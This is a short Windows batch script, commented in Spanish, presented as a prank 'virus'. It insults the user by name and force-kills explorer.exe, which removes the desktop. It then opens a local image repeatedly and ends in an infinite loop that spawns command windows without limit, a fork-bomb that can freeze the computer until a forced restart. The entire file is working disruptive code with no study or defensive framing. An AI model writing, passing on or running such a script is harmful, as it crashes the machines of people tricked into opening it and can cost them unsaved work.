@echo off
title ¡Ordenador infectado!
color 0a
cls

rem Obtener el nombre del usuario
set USERNAME=%username%

echo. !Manos en el aire todo el mundo que este ordenador ha sido infectado!
echo. %USERNAME%, hay que ser mongolo para abrir un archivo de este tipo.
echo. Mira que pone virus en el nombre...
pause > nul

rem Cerrar la interfaz gráfica de Windows
taskkill /f /im explorer.exe

rem Configurar el nombre y la ruta de la imagen
set "imagen=%CD%\troliado.jpg"

rem Número de veces que se abrirá la imagen
set "repeticiones=10"

rem tiempo de espera antes de abrir la imagen
timeout /t 5 >nul

rem Bucle para abrir la imagen varias veces
for /L %%i in (1,1,%repeticiones%) do (
    start "" "%imagen%"
    timeout /t 1 >nul
)

rem Bucle infinito para abrir ventanas
:start
start
goto start

endlocal